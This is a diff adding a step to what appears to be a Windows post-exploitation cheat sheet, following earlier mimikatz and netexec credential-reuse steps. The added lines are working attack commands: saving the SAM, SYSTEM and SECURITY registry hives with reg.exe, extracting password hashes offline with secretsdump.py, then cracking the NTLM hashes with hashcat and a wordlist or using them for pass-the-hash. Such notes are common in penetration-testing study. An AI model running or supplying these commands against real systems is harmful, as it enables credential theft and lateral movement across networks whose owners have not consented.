@@ -39,3 +39,19 @@ Download executable
         lsadump::lsa
 
 7) Collect cleartext/ntlm credentials and test them on different machines in the network using different protocols like smb, winrm and rdp for example using netexec
+
+8) SAM Registry Keys
+
+        reg.exe save hklm\sam C:\sam.save
+
+        reg.exe save hklm\system C:\system.save
+
+        reg.exe save hklm\security C:\security.save
+
+Then on Kali machine:
+
+        secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
+
+Then crack dumped NTLM hashes with hashcat or do a Pass-the-Hash attack
+
+         sudo hashcat -m 1000 ntlm_hash.txt /usr/share/wordlists/rockyou.txt
